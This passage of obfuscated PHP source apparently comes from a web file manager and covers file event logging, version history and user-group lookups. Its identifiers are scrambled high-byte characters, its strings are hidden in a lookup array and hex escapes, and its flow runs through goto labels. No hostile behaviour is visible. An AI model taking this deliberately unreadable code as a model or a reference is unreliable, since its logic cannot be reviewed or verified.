$Eç“âãˆ√∂) { $EñØ∂∑Àìó = array_reverse(array_slice($cœ¡…¡¢àü, $Eç“âãˆ√∂)); $EìﬁÉ›õÍˆ = array_search($eìéü∏ÆÈ∂, $EñØ∂∑Àìó); if ($EìﬁÉ›õÍˆ !== !1 && $EìﬁÉ›õÍˆ + 1 <= $E¨≤ÙˆÕ¨á) { $E¨≤ÙˆÕ¨á = $EìﬁÉ›õÍˆ + 1; } } } goto A§ñ›Øíåï; cØ·⁄êﬂç™: $aÙÊÍåÀΩ€ =& $_SERVER[™⁄»üÆ]; $C¿ı§ï¶ÀÔ = $this->userGroupList($b˘«•©€ÉÆ); $E¨≤ÙˆÕ¨á = 1000; goto e≤é¥î≈¥ê; dàá÷¢¥¬“: } private function userGroupList($A¬≥ÙçöùÊ = false) { $DÔì‚˜í≥ã =& $_SERVER[™⁄»üÆ]; static $e¨Ü„≥äÆﬁ = array(); if (isset($e¨Ü„≥äÆﬁ[$A¬≥ÙçöùÊ])) { return $e¨Ü„≥äÆﬁ[$A¬≥ÙçöùÊ]; } $a§ﬁ¢’ﬁÙŒ = Model($DÔì‚˜í≥ã[520])->getInfo($A¬≥ÙçöùÊ); $e¨Ü„≥äÆﬁ[$A¬≥ÙçöùÊ] = array_to_keyvalue($a§ﬁ¢’ﬁÙŒ[$DÔì‚˜í≥ã[1884]], $DÔì‚˜í≥ã[1706]); return $e¨Ü„≥äÆﬁ[$A¬≥ÙçöùÊ]; } public function userGroupParents($fúõŒÇ©™ö) { goto eÒ†ºÓéä; C¨÷ÿÁà˘°: $dÊË≈¶®°§[$fúõŒÇ©™ö] = array_unique($c§Ö‚»‰ˆà); return $dÊË≈¶®°§[$fúõŒÇ©™ö]; goto F∑¡¬´ﬂß◊; b´ÿúñƒ¬ê: if (isset($dÊË≈¶®°§[$fúõŒÇ©™ö])) { return $dÊË≈¶®°§[$fúõŒÇ©™ö]; } $fòå£Û˘à« = $this->userGroupList($fúõŒÇ©™ö); $c§Ö‚»‰ˆà = array(); goto C¯Ñﬂüıéı; C¯Ñﬂüıéı: $e·áåŸ‘ãè = $GLOBALS[$A„€Ü’æÁ”[6]][$A„€Ü’æÁ”[88]][$A„€Ü’æÁ”[1803]] == 1; $dÖã∑è£ƒÔ = $e·áåŸ‘ãè ? 3 : 2; foreach ($fòå£Û˘à« as $c€ô≈Ó∞Íä) { $cÂ…â‰˘Î† = array($c€ô≈Ó∞Íä[$A„€Ü’æÁ”[1706]]); $e≈ìç¢¯†ü = explode($A„€Ü’æÁ”[47], trim($c€ô≈Ó∞Íä[$A„€Ü’æÁ”[503]], $A„€Ü’æÁ”[47])); if ($e≈ìç¢¯†ü[0] == $A„€Ü’æÁ”[191] && count($e≈ìç¢¯†ü) > $dÖã∑è£ƒÔ) { $D¬¿áÀñŒ¶ = array_slice($e≈ìç¢¯†ü, $dÖã∑è£ƒÔ); $cÂ…â‰˘Î† = array_merge($cÂ…â‰˘Î†, array_reverse($D¬¿áÀñŒ¶)); } $c§Ö‚»‰ˆà = array_merge($c§Ö‚»‰ˆà, $cÂ…â‰˘Î†); } goto C¨÷ÿÁà˘°; eÒ†ºÓéä: $A„€Ü’æÁ” =& $_SERVER[™⁄»üÆ]; static $dÊË≈¶®°§ = array(); $fúõŒÇ©™ö = $fúõŒÇ©™ö ? $fúõŒÇ©™ö : USER_ID; goto b´ÿúñƒ¬ê; F∑¡¬´ﬂß◊: } public function authTargetInfoMake($E∫ï∂ÃâÉÃ) { goto Dü≥µ¢„¯Í; C§Â¯∑úáú: foreach ($E∫ï∂ÃâÉÃ as $EÉ„ıﬁ¶Ò˘) { if ($EÉ„ıﬁ¶Ò˘[$d—∂Î∫ß∞‹[405]] == SourceModel::TYPE_USER) { $Eê◊ﬁÂî·é[] = intval($EÉ„ıﬁ¶Ò˘[$d—∂Î∫ß∞‹[485]]); } else { if ($EÉ„ıﬁ¶Ò˘[$d—∂Î∫ß∞‹[405]] == SourceModel::TYPE_GROUP) { $Eå–¶´∂∏ˆ[] = intval($EÉ„ıﬁ¶Ò˘[$d—∂Î∫ß∞‹[485]]); } } } if ($Eê◊ﬁÂî·é) { $Eê◊ﬁÂî·é = Model($d—∂Î∫ß∞‹[495])->userListInfo($Eê◊ﬁÂî·é); } if ($Eå–¶´∂∏ˆ) { $Fˆ¥ˆó»˘Ù = array($d—∂Î∫ß∞‹[1790] => array($d—∂Î∫ß∞‹[412], $Eå–¶´∂∏ˆ)); $Eå–¶´∂∏ˆ = Model($d—∂Î∫ß∞‹[504])->field($d—∂Î∫ß∞‹[1913])->where($Fˆ¥ˆó»˘Ù)->select(); $Eå–¶´∂∏ˆ = array_to_keyvalue($Eå–¶´∂∏ˆ, $d—∂Î∫ß∞‹[1706]); } goto Fçáè»Ÿ÷á; Dü≥µ¢„¯Í: $d—∂Î∫ß∞‹ =& $_SERVER[™⁄»üÆ]; $Eê◊ﬁÂî·é = array(); $Eå–¶´∂∏ˆ = array(); goto C§Â¯∑úáú; Fçáè»Ÿ÷á: return array($d—∂Î∫ß∞‹[1914] => $Eê◊ﬁÂî·é, $d—∂Î∫ß∞‹[1915] => $Eå–¶´∂∏ˆ); goto c¶øñ«˘ÕÀ; c¶øñ«˘ÕÀ: } public function authInfo($E€ÇØÉ–§ú) { $cç⁄´ˆáüØ =& $_SERVER[™⁄»üÆ]; if ($E€ÇØÉ–§ú[$cç⁄´ˆáüØ[1806]]) { $CÑ∂©àº…Ö = Model($cç⁄´ˆáüØ[489])->listData($E€ÇØÉ–§ú[$cç⁄´ˆáüØ[1806]]); if (!$CÑ∂©àº…Ö) { return !1; $E∏Ìáœ¡⁄µ = Model($cç⁄´ˆáüØ[489])->listData(); $BØìÈÿÌé‰ = array_filter_by_field($E∏Ìáœ¡⁄µ, $cç⁄´ˆáüØ[407], $cç⁄´ˆáüØ[191]); return $BØìÈÿÌé‰; } $f›™≥ﬂÔáå = array_field_key($CÑ∂©àº…Ö, array($cç⁄´ˆáüØ[394], $cç⁄´ˆáüØ[28], $cç⁄´ˆáüØ[407], $cç⁄´ˆáüØ[1728], $cç⁄´ˆáüØ[1729])); $f›™≥ﬂÔáå[$cç⁄´ˆáüØ[1916]] = $E€ÇØÉ–§ú; return $f›™≥ﬂÔáå; } else { return array($cç⁄´ˆáüØ[413] => 0, $cç⁄´ˆáüØ[1712] => $E€ÇØÉ–§ú[$cç⁄´ˆáüØ[1860]], $cç⁄´ˆáüØ[414] => $cç⁄´ˆáüØ[33], $cç⁄´ˆáüØ[1728] => $cç⁄´ˆáüØ[1917]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\x72\143\145\x5f\x65\x76\145\156\164"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\x54\x69\155\x65", "\x74\x69\155\145", "\x69\x6e\163\145\162\164", "\146\165\156\143\164\x69\157\156"), array("\x64\145\163\x63", '', "\151\x6e\163\145\162\x74\x2c\165\160\x64\141\164\x65\54\x73\145\154\145\x63\x74", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($a∆óÛ◊¥‰à, $fÙï·æëÃ‚, $c ÓÿìãÚí = '') { goto EáÏ¿°æ±ÿ; Fáóòﬁﬁ√ò: if (!$dï«©¢Ëû‡) { return !1; } if ($this->isCacheEvent($dï«©¢Ëû‡, $fÙï·æëÃ‚)) { return; } if ($c ÓÿìãÚí && is_string($c ÓÿìãÚí)) { $c ÓÿìãÚí = array($E¬ﬂÀ⁄ä§[1744] => $c ÓÿìãÚí); } goto eõ„ŸØ˜∫‰; FüÔ∆…˜ÇÀ: return $this->add($Dö”µæëÂŸ); goto E¨ÇÏÚ⁄àà; eõ„ŸØ˜∫‰: $Dö”µæëÂŸ = array($E¬ﬂÀ⁄ä§[411] => $a∆óÛ◊¥‰à, $E¬ﬂÀ⁄ä§[1918] => $dï«©¢Ëû‡[$E¬ﬂÀ⁄ä§[479]], $E¬ﬂÀ⁄ä§[1919] => $dï«©¢Ëû‡[$E¬ﬂÀ⁄ä§[28]], $E¬ﬂÀ⁄ä§[501] => !empty($dï«©¢Ëû‡[$E¬ﬂÀ⁄ä§[501]]) ? $dï«©¢Ëû‡[$E¬ﬂÀ⁄ä§[501]] : $E¬ﬂÀ⁄ä§[33], $E¬ﬂÀ⁄ä§[1528] => USER_ID, $E¬ﬂÀ⁄ä§[416] => $fÙï·æëÃ‚, $E¬ﬂÀ⁄ä§[1530] => $c ÓÿìãÚí); $this->addSystemLog($fÙï·æëÃ‚, $Dö”µæëÂŸ); unset($Dö”µæëÂŸ[$E¬ﬂÀ⁄ä§[1919]], $Dö”µæëÂŸ[$E¬ﬂÀ⁄ä§[501]]); goto FüÔ∆…˜ÇÀ; EáÏ¿°æ±ÿ: $E¬ﬂÀ⁄ä§ =& $_SERVER[™⁄»üÆ]; if (!$this->eventSave) { return; } $dï«©¢Ëû‡ = Model($E¬ﬂÀ⁄ä§[1214])->sourceInfo($a∆óÛ◊¥‰à); goto Fáóòﬁﬁ√ò; E¨ÇÏÚ⁄àà: } private function addSystemLog($b¯ﬁ«Õàµí, $Eå¥çî⁄‚ë) { $E¡ÉìÆ◊ËÏ =& $_SERVER[™⁄»üÆ]; if ($b¯ﬁ«Õàµí == $E¡ÉìÆ◊ËÏ[1920]) { $b¯ﬁ«Õàµí = $Eå¥çî⁄‚ë[$E¡ÉìÆ◊ËÏ[432]][$E¡ÉìÆ◊ËÏ[1921]]; } else { if (in_array($b¯ﬁ«Õàµí, array($E¡ÉìÆ◊ËÏ[1683], $E¡ÉìÆ◊ËÏ[1922]))) { $b¯ﬁ«Õàµí = $Eå¥çî⁄‚ë[$E¡ÉìÆ◊ËÏ[432]][$E¡ÉìÆ◊ËÏ[734]]; } } $f˘êêô†Ò = array_merge($Eå¥çî⁄‚ë, array($E¡ÉìÆ◊ËÏ[1923] => $Eå¥çî⁄‚ë[$E¡ÉìÆ◊ËÏ[396]], $E¡ÉìÆ◊ËÏ[1924] => $Eå¥çî⁄‚ë[$E¡ÉìÆ◊ËÏ[1924]])); Model($E¡ÉìÆ◊ËÏ[1647])->addLog($E¡ÉìÆ◊ËÏ[1925] . $b¯ﬁ«Õàµí, $f˘êêô†Ò); } private function isCacheEvent($eØ˜¡»çüÛ, $BåÎÆ„êŒé) { if ($eØ˜¡»çüÛ[$_SERVER[™⁄»üÆ][405]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($aÃÀ‹Òíµ…, $e¶∞äÎ†±Á) { $bÒåú˜≤µ© =& $_SERVER[™⁄»üÆ]; $e∞¯ı≥ ŒÉ = Model($bÒåú˜≤µ©[1214])->sourceInfo($aÃÀ‹Òíµ…); $d∏∫ ≠è⁄» = array($bÒåú˜≤µ©[1921] => $e¶∞äÎ†±Á, $bÒåú˜≤µ©[28] => $e∞¯ı≥ ŒÉ[$bÒåú˜≤µ©[28]]); return $this->addEvent($aÃÀ‹Òíµ…, $bÒåú˜≤µ©[1920], $d∏∫ ≠è⁄»); } public function eventFileEdit($bûáÜå∞æ ) { $A”µ§ñÉô‚ =& $_SERVER[™⁄»üÆ]; $CÑªŒù˘íÃ = array($A”µ§ñÉô‚[1926] => $_SERVER[$A”µ§ñÉô‚[1927]], $A”µ§ñÉô‚[1928] => strtolower(ACTION)); return $this->addEvent($bûáÜå∞æ , $A”µ§ñÉô‚[1673], $CÑªŒù˘íÃ); } public function eventRecycle($FÛ…˘ﬂΩ, $bµòÖ¿ Õá) { return $this->addEvent($FÛ…˘ﬂΩ, $_SERVER[™⁄»üÆ][1922], $bµòÖ¿ Õá); } public function eventRemove($C≈é‘¬ëâé) { $Eˆ¯Êﬂ˜Î— =& $_SERVER[™⁄»üÆ]; $CÊª⁄Òå˘« = Model($Eˆ¯Êﬂ˜Î—[1214])->sourceInfo($C≈é‘¬ëâé); $f›∑¯ƒ¢∫å = $CÊª⁄Òå˘«[$Eˆ¯Êﬂ˜Î—[28]]; return $this->addEvent($CÊª⁄Òå˘«[$Eˆ¯Êﬂ˜Î—[479]], $Eˆ¯Êﬂ˜Î—[1672], $f›∑¯ƒ¢∫å); } public function eventShare($D¢ôØ‘Öó◊, $c˘‡œ—äÍÑ) { return $this->addEvent($D¢ôØ‘Öó◊, $_SERVER[™⁄»üÆ][1683], $c˘‡œ—äÍÑ); } public function eventMove($D¬¡»À›‰ó, $d‘´›êìÇﬂ, $aßùàé≤â–) { goto A»ìÙÈÃ–ü; D≠¯πøÁ¥å: $CÉ¿’®öíÉ = $DùªØ™∏◊â->sourceInfo($d‘´›êìÇﬂ); $d≈¢ºÖÓÓ’ = $DùªØ™∏◊â->sourceInfo($aßùàé≤â–); $DÂπ†ïú∏‰ = array($Aú„πïû´π[1063] => $d‘´›êìÇﬂ, $Aú„πïû´π[1929] => $CÉ¿’®öíÉ[$Aú„πïû´π[28]], $Aú„πïû´π[1909] => !empty($CÉ¿’®öíÉ[$Aú„πïû´π[501]]) ? $CÉ¿’®öíÉ[$Aú„πïû´π[501]] : $Aú„πïû´π[33], $Aú„πïû´π[1064] => $aßùàé≤â–, $Aú„πïû´π[1930] => $d≈¢ºÖÓÓ’[$Aú„πïû´π[28]], $Aú„πïû´π[1931] => !empty($d≈¢ºÖÓÓ’[$Aú„πïû´π[501]]) ? $d≈¢ºÖÓÓ’[$Aú„πïû´π[501]] : $Aú„πïû´π[33]); goto D´™Ó§âŒ›; D´™Ó§âŒ›: $this->addEvent($D¬¡»À›‰ó, $Aú„πïû´π[534], $DÂπ†ïú∏‰); $e˜éëëŸ—÷ = $DùªØ™∏◊â->sourceInfo($D¬¡»À›‰ó); $DÂπ†ïú∏‰ = array($Aú„πïû´π[396] => $e˜éëëŸ—÷[$Aú„πïû´π[396]], $Aú„πïû´π[28] => $e˜éëëŸ—÷[$Aú„πïû´π[28]]); goto Eπåôõ‚°∏; Eπåôõ‚°∏: $this->addEvent($d‘´›êìÇﬂ, $Aú„πïû´π[1932], $DÂπ†ïú∏‰); goto E€´÷ø‚è¿; A»ìÙÈÃ–ü: $Aú„πïû´π =& $_SERVER[™⁄»üÆ]; $DùªØ™∏◊â = Model($Aú„πïû´π[1214]); $e˜éëëŸ—÷ = $DùªØ™∏◊â->sourceInfo($D¬¡»À›‰ó); goto D≠¯πøÁ¥å; E€´÷ø‚è¿: } public function eventCopy($dº™‹≈‚ˆﬁ) { $this->eventCreate($dº™‹≈‚ˆﬁ, $_SERVER[™⁄»üÆ][532]); } public function eventRename($dÌ¯«ä˘ï∆, $dÓ≥ƒàÔà†, $Fä∞“çëí‰) { $eÇñè⁄ı£î =& $_SERVER[™⁄»üÆ]; $dã™±Ã“πµ = array($eÇñè⁄ı£î[1063] => $dÓ≥ƒàÔà†, $eÇñè⁄ı£î[1064] => $Fä∞“çëí‰); return $this->addEvent($dÌ¯«ä˘ï∆, $eÇñè⁄ı£î[1228], $dã™±Ã“πµ); } public function eventAddComment($AøÙ¶†„Ï, $aççÉ‚“‘ﬁ) { return $this->addEvent($AøÙ¶†„Ï, $_SERVER[™⁄»üÆ][1933], $aççÉ‚“‘ﬁ); } public function eventAddDesc($DÚ¬ﬂ«⁄…å, $EÇï∫¢Òà∂) { return $this->addEvent($DÚ¬ﬂ«⁄…å, $_SERVER[™⁄»üÆ][1934], $EÇï∫¢Òà∂); } public function listBySource($FüÆ©É‡Œì) { goto C°è˘öÖ¢ø; aΩ÷≤˜±‹é: return $this->eventListParse($D´∆π« ƒù, $FüÆ©É‡Œì); goto a≤∫∆¢ﬁ£¶; C°è˘öÖ¢ø: $aÏ¬ÊÜ·î =& $_SERVER[™⁄»üÆ]; $F≈·‹ÆÓÁÇ = Model($aÏ¬ÊÜ·î[1214])->sourceInfo($FüÆ©É‡Œì); $E†¿î—πî® = array($aÏ¬ÊÜ·î[411] => $FüÆ©É‡Œì); goto d†≈Õïè¿¡; d†≈Õïè¿¡: if ($F≈·‹ÆÓÁÇ[$aÏ¬ÊÜ·î[404]] == $aÏ¬ÊÜ·î[87]) { $c¢ÚÇ·Ùı® = Model($aÏ¬ÊÜ·î[1214])->listSearchChildren($FüÆ©É‡Œì, 20000); $c¢ÚÇ·Ùı®[] = $FüÆ©É‡Œì . $aÏ¬ÊÜ·î[375]; $E†¿î—πî® = array($aÏ¬ÊÜ·î[396] => array($aÏ¬ÊÜ·î[7], $c¢ÚÇ·Ùı®)); } $D´∆π« ƒù = $this->where($E†¿î—πî®)->order($aÏ¬ÊÜ·î[1935])->selectPage(); if ($D´∆π« ƒù[$aÏ¬ÊÜ·î[364]][$aÏ¬ÊÜ·î[365]] == 0) { $D´∆π« ƒù[$aÏ¬ÊÜ·î[364]][$aÏ¬ÊÜ·î[365]] = 1; $D´∆π« ƒù[$aÏ¬ÊÜ·î[367]] = array(array($aÏ¬ÊÜ·î[411] => $FüÆ©É‡Œì, $aÏ¬ÊÜ·î[1918] => $F≈·‹ÆÓÁÇ[$aÏ¬ÊÜ·î[479]], $aÏ¬ÊÜ·î[1528] => $F≈·‹ÆÓÁÇ[$aÏ¬ÊÜ·î[433]], $aÏ¬ÊÜ·î[416] => $aÏ¬ÊÜ·î[1936], $aÏ¬ÊÜ·î[417] => $F≈·‹ÆÓÁÇ[$aÏ¬ÊÜ·î[194]], $aÏ¬ÊÜ·î[1530] => $aÏ¬ÊÜ·î[33])); } goto aΩ÷≤˜±‹é; a≤∫∆¢ﬁ£¶: } private function eventListParse($cÛÓ‰¡˜∂Œ, $fÊ≠ÌæòÎã) { goto dÁùπôá‘Ç; dÁùπôá‘Ç: $eﬂÚ°ê›ÒÏ =& $_SERVER[™⁄»üÆ]; $a¢˜«Ê¬Ú• = $cÛÓ‰¡˜∂Œ[$eﬂÚ°ê›ÒÏ[367]]; $fóÈ°“ëÿ≤ = array_to_keyvalue($a¢˜«Ê¬Ú•, $eﬂÚ°ê›ÒÏ[33], $eﬂÚ°ê›ÒÏ[396]); goto b§¢òÒ˜¢Ô; c‘€º∆‡à§: $Fÿ©ß≥∞⁄Û = Model($eﬂÚ°ê›ÒÏ[809])->sourceListInfo($fóÈ°“ëÿ≤, !0); foreach ($a¢˜«Ê¬Ú• as &$cñáñƒﬂﬁã) { if ($cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[29]] == $eﬂÚ°ê›ÒÏ[534] && isset($cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[432]][$eﬂÚ°ê›ÒÏ[1063]])) { $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[432]][$eﬂÚ°ê›ÒÏ[1063]] = $Fÿ©ß≥∞⁄Û[$cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[432]][$eﬂÚ°ê›ÒÏ[1063]]]; $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[432]][$eﬂÚ°ê›ÒÏ[1064]] = $Fÿ©ß≥∞⁄Û[$cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[432]][$eﬂÚ°ê›ÒÏ[1064]]]; } if ($cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[29]] == $eﬂÚ°ê›ÒÏ[1932] && isset($cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[432]][$eﬂÚ°ê›ÒÏ[396]])) { $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[432]][$eﬂÚ°ê›ÒÏ[396]] = $Fÿ©ß≥∞⁄Û[$cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[432]][$eﬂÚ°ê›ÒÏ[396]]]; } $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[85]] = $Fÿ©ß≥∞⁄Û[$cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[396]]]; $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[1937]] = $Fÿ©ß≥∞⁄Û[$cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[1924]]]; if ($cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[29]] == $eﬂÚ°ê›ÒÏ[1672]) { $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[1937]] = $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[85]]; $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[1924]] = $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[1937]][$eﬂÚ°ê›ÒÏ[396]]; $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[85]] = !1; $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[396]] = $eﬂÚ°ê›ÒÏ[33]; } $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[1868]] = $DíÂƒáàÒ≤[$cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[1537]]]; } unset($cñáñƒﬂﬁã); goto CÑˆıÖì›é; CÑˆıÖì›é: $cÛÓ‰¡˜∂Œ[$eﬂÚ°ê›ÒÏ[367]] = $a¢˜«Ê¬Ú•; return $cÛÓ‰¡˜∂Œ; goto f≈‚¬ƒ‰â“; b§¢òÒ˜¢Ô: $e®äÇîô◊ = array_to_keyvalue($a¢˜«Ê¬Ú•, $eﬂÚ°ê›ÒÏ[33], $eﬂÚ°ê›ÒÏ[1924]); foreach ($a¢˜«Ê¬Ú• as $cñáñƒﬂﬁã) { $CäØÙØÛáﬂ = $cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[432]]; if ($cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[29]] == $eﬂÚ°ê›ÒÏ[534] && isset($CäØÙØÛáﬂ[$eﬂÚ°ê›ÒÏ[1063]])) { $fóÈ°“ëÿ≤[] = $CäØÙØÛáﬂ[$eﬂÚ°ê›ÒÏ[1063]] . $eﬂÚ°ê›ÒÏ[33]; $fóÈ°“ëÿ≤[] = $CäØÙØÛáﬂ[$eﬂÚ°ê›ÒÏ[1064]] . $eﬂÚ°ê›ÒÏ[33]; } if ($cñáñƒﬂﬁã[$eﬂÚ°ê›ÒÏ[29]] == $eﬂÚ°ê›ÒÏ[1932] && isset($CäØÙØÛáﬂ[$eﬂÚ°ê›ÒÏ[396]])) { $fóÈ°“ëÿ≤[] = $CäØÙØÛáﬂ[$eﬂÚ°ê›ÒÏ[396]] . $eﬂÚ°ê›ÒÏ[33]; } } $fóÈ°“ëÿ≤ = array_merge($fóÈ°“ëÿ≤, $e®äÇîô◊, array($fÊ≠ÌæòÎã . $eﬂÚ°ê›ÒÏ[33])); goto AÜõ°ÎŸ¥ª; AÜõ°ÎŸ¥ª: $fóÈ°“ëÿ≤ = array_unique($fóÈ°“ëÿ≤); $eæ¢¯Ü„«Œ = array_unique(array_to_keyvalue($a¢˜«Ê¬Ú•, $eﬂÚ°ê›ÒÏ[33], $eﬂÚ°ê›ÒÏ[1537])); $DíÂƒáàÒ≤ = Model($eﬂÚ°ê›ÒÏ[520])->userListInfo($eæ¢¯Ü„«Œ); goto c‘€º∆‡à§; f≈‚¬ƒ‰â“: } public function removeBySource($døÏ∆ßüÕÀ) { $E∞Ô´Óﬂäâ = array($_SERVER[™⁄»üÆ][411] => $døÏ∆ßüÕÀ); $this->where($E∞Ô´Óﬂäâ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\x75\162\143\x65\x5f\150\151\163\164\157\162\x79"; public function historyCount($Fø™Â°πË·) { goto e†éëœÈ’Â; FÓ∞û¿‰ñ´: $eéπ‚çÉ∏é = array($D’òÈêñëâ[396], $D’òÈêñëâ[1738] => $D’òÈêñëâ[481]); $CïÑ†ëœîÿ = array($D’òÈêñëâ[396] => array($D’òÈêñëâ[7], $Fø™Â°πË·)); $bäâŸ∞õ„Õ = $this->field($eéπ‚çÉ∏é)->where($CïÑ†ëœîÿ)->group($D’òÈêñëâ[396])->select(); goto CË∫õöãòì; CË∫õöãòì: return array_to_keyvalue($bäâŸ∞õ„Õ, $D’òÈêñëâ[396], $D’òÈêñëâ[481]); goto Aƒ¯–Ö ±é; e†éëœÈ’Â: $D’òÈêñëâ =& $_SERVER[™⁄»üÆ]; if (!$Fø™Â°πË·) { return array(); } if (is_string($Fø™Â°πË·) || is_int($Fø™Â°πË·)) { $Fø™Â°πË· = array($Fø™Â°πË·); } goto FÓ∞û¿‰ñ´; Aƒ¯–Ö ±é: } public function addHistory($fÍ¡úﬂù’á, $DÔ·ˆ„·˜≠ = '') { $dÃ⁄πª≈ì¶ =& $_SERVER[™⁄»üÆ]; $bœßÓø›·ç = array($dÃ⁄πª≈ì¶[411] => $fÍ¡úﬂù’á[$dÃ⁄πª≈ì¶[396]], $dÃ⁄πª≈ì¶[1528] => isset($fÍ¡úﬂù’á[$dÃ⁄πª≈ì¶[435]]) ? $fÍ¡úﬂù’á[$dÃ⁄πª≈ì¶[435]] : $fÍ¡úﬂù’á[$dÃ⁄πª≈ì¶[433]], $dÃ⁄πª≈ì¶[449] => $fÍ¡úﬂù’á[$dÃ⁄πª≈ì¶[448]], $dÃ⁄πª≈ì¶[562] => $fÍ¡úﬂù’á[$dÃ⁄πª≈ì¶[78]], $dÃ⁄πª≈ì¶[1938] => $DÔ·ˆ„·˜≠); $fºß’öÜ—Ã = $GLOBALS[$dÃ⁄πª≈ì¶[6]][$dÃ⁄πª≈ì¶[88]][$dÃ⁄πª≈ì¶[1112]]; if ($fºß’öÜ—Ã > 1) { $this->historyAutoClear($bœßÓø›·ç[$dÃ⁄πª≈ì¶[396]]); $this->add($bœßÓø›·ç); } Hook::trigger($dÃ⁄πª≈ì¶[1939], $bœßÓø›·ç); Model($dÃ⁄πª≈ì¶[1940])->eventFileEdit($fÍ¡úﬂù’á[$dÃ⁄πª≈ì¶[396]]); } private function historyAutoClear($bª≤˘ÿªí) { goto cªÊÉ”Ù‘ˆ; Aç≥√–Óàë: $AèÕçΩàÆª = array_to_keyvalue($F–†à¥ËéÜ, $båöÈÂáÉ—[33], $båöÈÂáÉ—[394]); $AèÕçΩàÆª = array_slice($AèÕçΩàÆª, $EÓÑ¥ƒö–Û); $eæ•ØÜ•©ä = array_to_keyvalue($F–†à¥ËéÜ, $båöÈÂáÉ—[33], $båöÈÂáÉ—[448]); goto e¡ºù©æòÉ; cı˜æä¡òæ: $F◊ëéäâœô = array($båöÈÂáÉ—[411] => $bª≤˘ÿªí); $F–†à¥ËéÜ = $this->field($båöÈÂáÉ—[1941])->where($F◊ëéäâœô)->order($båöÈÂáÉ—[1935])->select(); if (!$F–†à¥ËéÜ || $EÓÑ¥ƒö–Û >= count($F–†à¥ËéÜ)) { return; } goto Aç≥√–Óàë; búòÈ»†çÆ: $this->where($F◊ëéäâœô)->delete(); Model($båöÈÂáÉ—[451])->remove($eæ•ØÜ•©ä); goto bö≠Éÿƒﬁ÷; BÉë„ó«ä¶: $EÓÑ¥ƒö–Û = $BäÒ£ÈÏØ† == $båöÈÂáÉ—[1135] ? 5 : $Cû®ÔÎ»å≈; if ($Cû®ÔÎ»å≈ <= 1) { $EÓÑ¥ƒö–Û = 1; } if ($EÓÑ¥ƒö–Û >= 500) { return; } goto cı˜æä¡òæ; e¡ºù©æòÉ: $eæ•ØÜ•©ä = array_slice($eæ•ØÜ•©ä, $EÓÑ¥ƒö–Û); if (!$AèÕçΩàÆª || !$eæ•ØÜ•©ä) { return; } $F◊ëéäâœô = array($båöÈÂáÉ—[413] => array($båöÈÂáÉ—[7], $AèÕçΩàÆª)); goto búòÈ»†çÆ; cªÊÉ”Ù‘ˆ: $båöÈÂáÉ— =& $_SERVER[™⁄»üÆ]; $BäÒ£ÈÏØ† = Model($båöÈÂáÉ—[749])->get($båöÈÂáÉ—[1134]); $Cû®ÔÎ»å≈ = $GLOBALS[$båöÈÂáÉ—[6]][$båöÈÂáÉ—[88]][$båöÈÂáÉ—[1112]]; goto BÉë„ó«ä¶; bö≠Éÿƒﬁ÷: } public function listData($bà∫§â¬ºé) { goto d‡âë»ÉèÉ; BÀ¢©§‘ë§: $a«á≤ùÈ¿ß = $this->field($F⁄ùƒóáãƒ)->where($e«Àñ◊∫©ﬁ)->order($FÏâπ…öÉ§[1935])->selectPage(); $this->_listAppendUser($a«á≤ùÈ¿ß[$FÏâπ…öÉ§[367]]); $cÖ£ÿ˘∞“ﬁ = Model($FÏâπ…öÉ§[749])->get($FÏâπ…öÉ§[1134]); goto A≤á†Ù¬ÊÈ; d‡âë»ÉèÉ: $FÏâπ…öÉ§ =& $_SERVER[™⁄»üÆ]; $e«Àñ◊∫©ﬁ = array($FÏâπ…öÉ§[411] => $bà∫§â¬ºé); $F⁄ùƒóáãƒ = $FÏâπ…öÉ§[1942]; goto BÀ¢©§‘ë§; A≤á†Ù¬ÊÈ: $A¯ÖÒ≈à´Õ = 5; if ($cÖ£ÿ˘∞“ﬁ == $FÏâπ…öÉ§[1135]) { $a«á≤ùÈ¿ß[$FÏâπ…öÉ§[367]] = array_slice($a«á≤ùÈ¿ß[$FÏâπ…öÉ§[367]], 0, $A¯ÖÒ≈à´Õ); $a«á≤ùÈ¿ß[$FÏâπ…öÉ§[364]] = array($FÏâπ…öÉ§[1943] => 1, $FÏâπ…öÉ§[1944] => 20, $FÏâπ…öÉ§[1945] => 1, $FÏâπ…öÉ§[1946] => count($a«á≤ùÈ¿ß[$FÏâπ…öÉ§[367]])); } return $a«á≤ùÈ¿ß; goto Eç’≈ÏìÓö; Eç’≈ÏìÓö: } protected function _listAppendUser(&$C¨ﬂãâŸŒ) { $fê∆œ€ƒŸ =& $_SERVER[™⁄»üÆ]; $Cáë˜‹âÉ· = array_to_keyvalue($C¨ﬂãâŸŒ, $fê∆œ€ƒŸ[33], $fê∆œ€ƒŸ[1537]); 